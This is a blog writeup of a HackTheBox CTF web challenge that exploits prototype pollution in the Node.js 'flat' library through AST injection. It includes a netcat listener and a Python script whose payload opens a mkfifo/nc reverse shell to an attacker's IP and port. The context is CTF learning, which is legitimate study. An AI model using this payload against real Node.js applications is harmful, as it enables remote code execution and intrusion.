---
title: "Writeup : CyberApocalypse - Blitzprop"
date: 2021-04-30T07:50:30+02:00
tags: ["writeup", "blitzprop" ]
author: "Me"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Desc Text."
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true

editPost:
    URL: "https://github.com/hironichu/ekko.pw/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Introduction

Hello there, today I wanted to share with you my little writeup for the Hackthebox CyberApocalypse CTF event of 2021, I don't want to write a big post about it because there isn't much to cover, but the exploit here was quite new to me, so I learned while doing it.

This challenge was one of the first in the web section of the CTF, not classified as a hard one, one of my team member started enumeration and I completed it.

## Enumeration

To start enumeration we download the zip file from the challenge page, this gives you the sources of the server, which is kind of required in order to not go crazy trying to blind-test everything

I made a backup that you can download here https://cdn.discordapp.com/attachments/589953624923308060/837568958701895710/web_blitzprop.zip

>(Yes I use discord as a CDN for my images and data, what's the big deal? its free)


Here is the content of the zip file (in case you don't want to download it from an unknown source, (which tbh, you shouldn't))
![](https://cdn.discordapp.com/attachments/589953624923308060/837570554713997312/unknown.png)


 
This was the first node.js appplication that I tried to hack in a CTF, so my teammate search the most interesting files in order to start finding what can possibly exploited.

After reading some of the files, we can notice that it uses Pug , Flat and Express.

We can check the version of each of this lib in the package.json file

![](https://cdn.discordapp.com/attachments/589953624923308060/837576642842460180/package.json_1.png)

I wont go into much detail by posting link or screenshot, but if we check the version of each package we found that flat is vulnerable to prototype polution, a vulnerability that allows us to run our own javascript code within the app.

https://snyk.io/vuln/SNYK-JS-FLAT-596927

Great! but how do we do that?

I am glad you ask because I didn't know at the time, the POC on Snyk is not really useful if you ask me..

First let's take a look to where Flat is used and where the unflatten method is called in order to know if and where we can inject a payload.

The file `routes/index.js` is where we need to look
![](https://cdn.discordapp.com/attachments/589953624923308060/837577870959968346/carbon_1.png)

We can now see that when we send a request to `/api/submit`, the app directly unflatten the request body

Let's use that and send a vulnerable payload to the app..
Wait.. I don't have any in mind, fortunatly, when we search for such exploit, we found some nice resources, and I think I stumble uppon a nice blogpost that explains litteraly everything you have to know about this exploit, or even, multiple type of exploit linked to what you are about to see.

### External ressources informations
---
https://blog.p6.is/AST-Injection/

Here you can have a good idea on what is an AST Injection,

AST Stand for `Abstract syntax tree`

all credits to the writer of this post, you can see here how basically you can inject a payload to get a RCE (Remote Code Execution) using this type of attack.

![](https://blog.p6.is/img/2020/08/graph_3.jpg)

---

If you took the time to read this article, or not, it doesn't really matter, it's just really useful !

Let's go straight forward to the foothold

## Exploit

Let's run the usual netcat listener

```s
nc -lnvp 1337
```

I made this python script that uses a bit of the examples you can find in the previously mentioned blogpost

```python
TARGET = 'http://138.68.132.86:31704'
IP = 'Changeme'
PORT = '1337'

#This payload send a maliciously crafted AST, which will be executed after the handlebars.compile method

requestdata = requests.post(TARGET + '/api/submit', json = {
        "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ IP +" "+ PORT +" >/tmp/f`)"
        
        }
    })
print(requestdata.text)
#Then we execute a true query to trigger the code
requestdata = requests.post(TARGET + '/api/submit', json = {
    "song.name":"Not Polluting with the boys"
})
print(requestdata.text)
```

You can change the payload command in the `"line": ""` string

You can then execute the payload and you should have something working :

![](https://i.imgur.com/2DniJNa.png)


Once that is done, you grab the flag and there you go !


## End Note

I must tell you that this challenge was really easy because it was based on one in HTB, so a writeup led me to understanding the crafted payload, I had to change it a bit to make it work.

Thanks to LightDiscord and my team for the work done in this CTF !
